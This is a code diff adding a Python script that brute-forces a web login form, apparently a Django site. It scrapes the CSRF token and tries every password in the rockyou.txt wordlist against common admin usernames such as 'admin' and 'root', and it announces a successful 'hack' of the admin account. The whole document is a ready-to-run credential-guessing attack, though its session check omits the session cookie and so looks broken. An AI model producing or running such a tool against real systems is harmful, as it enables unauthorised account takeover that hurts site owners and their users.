@@ -1,0 +1,44 @@
+import requests
+from bs4 import BeautifulSoup
+
+host = 'http://192.168.1.254'  # TODO: change accordingly
+most_common_admin_usernames = ['admin', 'dbadmin', 'administrator', 'root', 'userAdmin']
+passwords_file = open('rockyou.txt', "rb")
+lines = passwords_file.read().splitlines()
+
+
+def brute_force_password(username):
+    page = f'{host}/login/'
+    r = requests.get(page)
+    soup = BeautifulSoup(r.text, 'html.parser')
+
+    csrf_input = soup.find('input', attrs={'name': 'csrfmiddlewaretoken'})
+    if csrf_input:
+        csrfmiddlewaretoken = csrf_input.get('value')
+        cookies = {'csrftoken': r.cookies['csrftoken']}
+
+        print(f'Bruteforcing user: {username}')
+        for password in lines:
+            data = {'csrfmiddlewaretoken': csrfmiddlewaretoken, 'username': username, 'password': password}
+            r = requests.post(page, data, cookies=cookies)
+
+            if r.history:
+                session_id = r.history[0].cookies['sessionid']
+                cookies['sessionid'] = session_id
+                if check_admin_session(username):
+                    print(f'Congratulations! You hacked the admin account!')
+                    print(f'Username: {username}, Password: {password.decode("utf-8")}')
+                    return password
+        print(f'Bruteforce for user {username} failed.')
+    else:
+        print("Token CSRF não encontrado na página.")
+        return None
+
+
+def check_admin_session(username):
+    r = requests.get(f'{host}/')
+    return 'Welcome' in r.text and username in r.text
+
+
+for username in most_common_admin_usernames:
+    password = brute_force_password(username)
